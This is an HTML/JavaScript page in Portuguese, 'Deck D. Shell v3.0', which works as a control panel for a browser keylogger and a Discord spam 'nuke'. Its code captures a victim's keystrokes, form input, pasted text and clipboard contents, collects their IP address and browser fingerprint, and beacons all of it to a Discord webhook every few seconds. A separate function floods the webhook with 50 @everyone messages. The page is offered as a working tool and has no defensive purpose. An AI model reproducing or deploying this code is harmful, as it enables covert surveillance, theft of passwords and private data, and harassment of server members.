<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deck D. Shell v3.0 - Painel de Controle</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', monospace; 
            background: linear-gradient(45deg, #000, #001100); 
            color: #00ff00; 
            margin: 0; 
            padding: 20px; 
            height: 100vh; 
            overflow: hidden;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { 
            text-align: center; 
            font-size: 28px; 
            margin-bottom: 30px; 
            animation: glow 2s infinite;
            letter-spacing: 2px;
        }
        @keyframes glow { 
            0%, 100% { text-shadow: 0 0 10px #00ff00; } 
            50% { text-shadow: 0 0 25px #00ff00, 0 0 35px #00ff00; } 
        }
        .panel { 
            background: rgba(17,17,17,0.95); 
            padding: 25px; 
            border: 2px solid #00ff00; 
            margin: 15px 0; 
            border-radius: 8px; 
            backdrop-filter: blur(10px);
            box-shadow: 0 0 20px rgba(0,255,0,0.3);
        }
        .input-group { margin: 15px 0; }
        .input { 
            width: 100%; 
            padding: 15px; 
            background: rgba(0,0,0,0.8); 
            color: #00ff00; 
            border: 2px solid #00ff00; 
            font-family: inherit;
            font-size: 16px;
            border-radius: 5px;
            transition: all 0.3s;
        }
        .input:focus { 
            outline: none; 
            box-shadow: 0 0 15px #00ff00;
            border-color: #00ff41;
        }
        .btn { 
            padding: 12px 25px; 
            background: transparent; 
            color: #00ff00; 
            border: 2px solid #00ff00; 
            font-family: inherit;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .btn:hover { 
            background: #00ff00; 
            color: #000; 
            box-shadow: 0 0 20px #00ff00;
            transform: translateY(-2px);
        }
        .btn:active { transform: translateY(0); }
        .btn-danger { border-color: #ff0040; color: #ff0040; }
        .btn-danger:hover { background: #ff0040; color: #000; }
        .btn-success { border-color: #00ff41; color: #00ff41; }
        .btn-success:hover { background: #00ff41; color: #000; }
        .btn-warning { border-color: #ffaa00; color: #ffaa00; }
        .btn-warning:hover { background: #ffaa00; color: #000; }
        .hidden { display: none; }
        .status { 
            padding: 15px; 
            border-radius: 5px; 
            margin: 10px 0;
            text-align: center;
            font-weight: bold;
        }
        .status.success { background: rgba(0,255,65,0.2); border: 1px solid #00ff41; }
        .status.error { background: rgba(255,0,64,0.2); border: 1px solid #ff0040; }
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
            opacity: 0.1;
        }
        .terminal { 
            background: rgba(0,0,0,0.5); 
            border: 1px solid #00ff00; 
            padding: 15px; 
            height: 200px; 
            overflow-y: auto; 
            font-size: 14px;
            border-radius: 5px;
            margin: 10px 0;
        }
        .terminal-line { margin: 2px 0; }
        .blink { animation: blink 1s infinite; }
        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0.3; } }
        .prompt { color: #00ff41; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .tab-btn { 
            background: transparent; 
            border: 1px solid #00ff00; 
            color: #00ff00; 
            padding: 10px 20px; 
            margin: 0 2px; 
            cursor: pointer;
            border-radius: 5px 5px 0 0;
        }
        .tab-btn.active { background: #00ff00; color: #000; }
        .nuke-section { background: rgba(255,0,64,0.1); border: 2px solid #ff0040; }
    </style>
</head>
<body>
    <canvas class="matrix-bg" id="matrix"></canvas>
    
    <div class="container">
        <div class="header">⚙️ Deck D. Shell v3.0 - Painel de Controle Avançado</div>
        
        <!-- Configuração Webhook -->
        <div id="configPanel" class="panel">
            <h3>🔗 Configurar Webhook Discord</h3>
            <div class="input-group">
                <label>Webhook URL:</label>
                <input type="url" class="input" id="webhookInput" placeholder="https://discord.com/api/webhooks/ID/TOKEN">
            </div>
            <div class="input-group">
                <button class="btn btn-success" onclick="testWebhook()">🧪 Testar</button>
                <button class="btn btn-success" onclick="deployPayload()">🚀 Deploy</button>
                <button class="btn" onclick="generateWebhook()">🔄 Novo Webhook</button>
            </div>
            <div id="statusMsg"></div>
        </div>

        <!-- Painel Principal -->
        <div id="mainPanel" class="panel hidden">
            <div style="display: flex; gap: 10px; margin-bottom: 20px;">
                <button class="tab-btn active" onclick="switchTab('messages')">💬 Mensagens</button>
                <button class="tab-btn" onclick="switchTab('nuke')">💣 Nuke</button>
                <button class="tab-btn" onclick="switchTab('terminal')">📱 Terminal</button>
            </div>

            <!-- Aba Mensagens -->
            <div id="messagesTab" class="tab-content active">
                <h3>📨 Manipulador de Mensagens</h3>
                <div class="input-group">
                    <textarea class="input" id="messageContent" rows="4" placeholder="Digite qualquer mensagem para enviar via webhook..."></textarea>
                </div>
                <div class="input-group">
                    <input class="input" id="messageUsername" placeholder="Username (opcional)">
                    <input class="input" id="messageAvatar" placeholder="Avatar URL (opcional)">
                </div>
                <button class="btn btn-success" onclick="sendCustomMessage()">📤 Enviar Mensagem</button>
            </div>

            <!-- Aba Nuke -->
            <div id="nukeTab" class="tab-content nuke-section">
                <h3>💣 Opções de Nuke</h3>
                <div class="input-group">
                    <button class="btn btn-warning" onclick="sendTestNuke()">🧪 Nuke de Teste</button>
                    <button class="btn btn-danger" onclick="sendRealNuke()">💥 Nuke Real</button>
                </div>
                <div style="margin-top: 15px; padding: 15px; background: rgba(255,0,64,0.1); border-radius: 5px;">
                    <strong>⚠️ Nuke Real:</strong> Envia spam massivo + embeds + pings até rate limit
                </div>
            </div>

            <!-- Aba Terminal -->
            <div id="terminalTab" class="tab-content">
                <div id="payloadTerminal" class="terminal"></div>
                <input type="text" class="input" id="commandInput" placeholder="Digite comandos aqui..." autocomplete="off">
            </div>
        </div>
    </div>

    <script>
        class DeckDShellV3 {
            constructor(webhookUrl) {
                this.webhook = webhookUrl;
                this.keystrokes = [];
                this.sessionData = {};
                this.lastFlush = 0;
                this.isActive = false;
                this.terminalLines = [];
                this.victimIPs = new Set(); // IPs das vítimas (NÃO do admin)
                this.init();
            }

            init() {
                this.matrixEffect();
                this.grabVictimIP(); // Pega IP da vítima, não do admin
                this.collectVictimInfo();
                this.deployAdvancedKeylogger();
                this.monitorVictimActivity();
                this.isActive = true;
                this.beaconInterval = setInterval(() => this.sendBeacon(), 10000);
                this.addTerminalLine('✓ Deck D. Shell v3.0 inicializado');
                this.addTerminalLine('✓ Keylogger avançado: ATIVO');
                this.addTerminalLine('✓ Captura de IP vítima: OK');
            }

            matrixEffect() {
                const canvas = document.getElementById('matrix');
                const ctx = canvas.getContext('2d');
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                
                const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
                const fontSize = 14;
                const columns = canvas.width / fontSize;
                const drops = Array(Math.floor(columns)).fill(1);
                
                function draw() {
                    ctx.fillStyle = 'rgba(0, 20, 0, 0.05)';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    ctx.fillStyle = '#00ff00';
                    ctx.font = fontSize + 'px monospace';
                    
                    for (let i = 0; i < drops.length; i++) {
                        const text = chars[Math.floor(Math.random() * chars.length)];
                        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975)
                            drops[i] = 0;
                        drops[i]++;
                    }
                }
                setInterval(draw, 50);
            }

            async grabVictimIP() {
                try {
                    // Pega IP real da vítima via múltiplas fontes
                    const responses = await Promise.allSettled([
                        fetch('https://api.ipify.org?format=json'),
                        fetch('https://api64.ipify.org?format=json'),
                        fetch('https://icanhazip.com')
                    ]);
                    
                    for (let resp of responses) {
                        if (resp.status === 'fulfilled') {
                            try {
                                if (resp.value.url.includes('ipify')) {
                                    const data = await resp.value.json();
                                    this.sessionData.victimIP = data.ip;
                                    this.victimIPs.add(data.ip);
                                } else {
                                    const text = await resp.value.text();
                                    this.sessionData.victimIP = text.trim();
                                    this.victimIPs.add(text.trim());
                                }
                                break;
                            } catch(e) {}
                        }
                    }
                    this.addTerminalLine(`✓ IP vítima capturado: ${this.sessionData.victimIP}`);
                } catch(e) {
                    this.sessionData.victimIP = 'N/A';
                }
            }

            collectVictimInfo() {
                this.sessionData.ua = navigator.userAgent;
                this.sessionData.language = navigator.language;
                this.sessionData.platform = navigator.platform;
                this.sessionData.screen = `${screen.width}x${screen.height}`;
                this.sessionData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                this.sessionData.webgl = this.getWebGLInfo();
                this.addTerminalLine('✓ Perfil vítima coletado');
            }

            getWebGLInfo() {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                return gl ? gl.getParameter(gl.RENDERER) : 'N/A';
            }

            deployAdvancedKeylogger() {
                // Keylogger melhorado - captura TUDO
                document.addEventListener('keydown', (e) => this.captureKeystroke(e), true);
                document.addEventListener('keyup', (e) => this.captureKeystroke(e), true);
                document.addEventListener('input', (e) => this.captureInput(e), true);
                document.addEventListener('paste', (e) => this.capturePaste(e), true);
                document.addEventListener('copy', () => this.captureClipboard());
                this.addTerminalLine('✓ Keylogger nível 3: CAPTURA TOTAL');
            }

            captureKeystroke(e) {
                const keyData = {
                    key: e.key || String.fromCharCode(e.keyCode),
                    code: e.code,
                    shift: e.shiftKey,
                    ctrl: e.ctrlKey,
                    alt: e.altKey,
                    type: e.type,
                    target: e.target.tagName + (e.target.id ? `#${e.target.id}` : ''),
                    timestamp: Date.now()
                };
                this.keystrokes.push(keyData);
            }

            captureInput(e) {
                this.keystrokes.push({
                    type: 'input',
                    value: e.target.value.substring(-10),
                    target: e.target.tagName,
                    timestamp: Date.now()
                });
            }

            capturePaste(e) {
                navigator.clipboard.readText().then(text => {
                    this.keystrokes.push({
                        type: 'paste',
                        content: text.substring(0, 50),
                        timestamp: Date.now()
                    });
                });
            }

            captureClipboard() {
                navigator.clipboard.readText().then(text => {
                    this.keystrokes.push({
                        type: 'clipboard',
                        content: text.substring(0, 100),
                        timestamp: Date.now()
                    });
                });
            }

            monitorVictimActivity() {
                setInterval(() => {
                    if (this.keystrokes.length > this.lastFlush) {
                        this.flushKeystrokes();
                    }
                }, 3000);
            }

            addTerminalLine(message) {
                this.terminalLines.push(message);
                const terminal = document.getElementById('payloadTerminal');
                const div = document.createElement('div');
                div.className = 'terminal-line';
                div.textContent = `Deck D. Shell> ${message}`;
                terminal.appendChild(div);
                terminal.scrollTop = terminal.scrollHeight;
            }

            async sendBeacon() {
                const payload = {
                    type: 'beacon_v3',
                    keystrokes: this.keystrokes.length,
                    victimIP: this.sessionData.victimIP,
                    victimData: this.sessionData,
                    timestamp: Date.now()
                };
                await this.postToWebhook(payload);
            }

            async flushKeystrokes() {
                if (this.keystrokes.length === this.lastFlush) return;
                const payload = {
                    type: 'keystrokes_v3',
                    data: this.keystrokes.slice(this.lastFlush),
                    victimIP: this.sessionData.victimIP,
                    total: this.keystrokes.length
                };
                await this.postToWebhook(payload);
                this.lastFlush = this.keystrokes.length;
                this.addTerminalLine(`✓ Enviado ${payload.data.length} eventos`);
            }

            async postToWebhook(data) {
                try {
                    await fetch(this.webhook, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                } catch(e) {}
            }
        }

        let shellInstance = null;
        let WEBHOOK_URL = '';

        // Funções Interativas
        async function testWebhook() {
            const webhook = document.getElementById('webhookInput').value.trim();
            if (!webhook) return showStatus('❌ Webhook vazio', 'error');
            
            try {
                const response = await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: '🧪 Deck D. Shell v3.0 - TESTE OK',
                        embeds: [{ title: 'Status', color: 0x00ff00, description: 'Webhook funcional!' }]
                    })
                });
                if (response.ok) {
                    WEBHOOK_URL = webhook;
                    showStatus('✅ Webhook ativo! Pronto para deploy', 'success');
                }
            } catch(e) {
                showStatus('❌ Erro webhook', 'error');
            }
        }

        function deployPayload() {
            if (!WEBHOOK_URL) return showStatus('❌ Teste webhook primeiro!', 'error');
            
            document.getElementById('configPanel').classList.add('hidden');
            document.getElementById('mainPanel').classList.remove('hidden');
            
            shellInstance = new DeckDShellV3(WEBHOOK_URL);
            showStatus('🚀 Payload v3.0 ativo - Keylogger + IP captura', 'success');
        }

        // Manipulador de Mensagens
        async function sendCustomMessage() {
            const content = document.getElementById('messageContent').value;
            const username = document.getElementById('messageUsername').value;
            const avatar = document.getElementById('messageAvatar').value;
            
            if (!content) return showStatus('❌ Digite uma mensagem', 'error');
            
            const payload = {
                content: content,
                username: username || 'Deck D. Shell v3.0',
                avatar_url: avatar
            };
            
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                showStatus('✅ Mensagem enviada!', 'success');
            } catch(e) {
                showStatus('❌ Erro envio', 'error');
            }
        }

        // Nuke de Teste
        async function sendTestNuke() {
            const testMessages = [
                '🧪 TESTE NUKE - MODO DEMO',
                '⚠️ Isso é apenas um teste!',
                '💥 Payload v3.0 funcional'
            ];
            
            for (let msg of testMessages) {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: JSON.stringify({ content: msg })
                });
                await new Promise(r => setTimeout(r, 500));
            }
            showStatus('✅ Teste Nuke executado (3 mensagens)', 'success');
        }

        // Nuke Real (Spam Massivo)
        async function sendRealNuke() {
            const nukePayloads = [];
            
            // 50 mensagens de spam variadas
            for (let i = 0; i < 50; i++) {
                nukePayloads.push({
                    content: `💥 NUKE EXECUTADO #${i+1} 💥 @everyone @here`,
                    embeds: [{
                        title: `Nuke ${i+1}`,
                        description: 'Deck D. Shell v3.0 - Payload Ativo',
                        color: 0xff0000
                    }]
                });
            }
            
            showStatus('💥 Executando Nuke Real...', 'error');
            
            for (let payload of nukePayloads) {
                try {
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                } catch(e) {
                    // Continua mesmo com rate limit
                }
                await new Promise(r => setTimeout(r, 100));
            }
            
            showStatus('✅ Nuke Real concluído (50 mensagens)', 'error');
        }

        function generateWebhook() {
            document.getElementById('webhookInput').value = 'https://discord.com/api/webhooks/123/abc';
            showStatus('📋 Cole seu webhook real e teste!', 'success');
        }

        function switchTab(tab) {
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(t => t.classList.remove('active'));
            
            document.getElementById(`${tab}Tab`).classList.add('active');
            event.target.classList.add('active');
        }

        function showStatus(msg, type) {
            const el = document.getElementById('statusMsg');
            el.textContent = msg;
            el.className = `status ${type}`;
        }

        // Terminal Commands
        document.getElementById('commandInput').addEventListener('keypress', async (e) => {
            if (e.key === 'Enter' && shellInstance) {
                const cmd = e.target.value;
                shellInstance.addTerminalLine(`$ ${cmd}`);
                
                if (cmd === 'stats') {
                    shellInstance.addTerminalLine(`IP Vítima: ${shellInstance.sessionData.victimIP}`);
                    shellInstance.addTerminalLine(`Teclas: ${shellInstance.keystrokes.length}`);
                } else if (cmd === 'flush') {
                    await shellInstance.flushKeystrokes();
                }
                
                e.target.value = '';
            }
        });

        // Inicialização
        window.addEventListener('load', () => {
            generateWebhook();
            document.getElementById('webhookInput').focus();
        });
    </script>
</body>
</html>
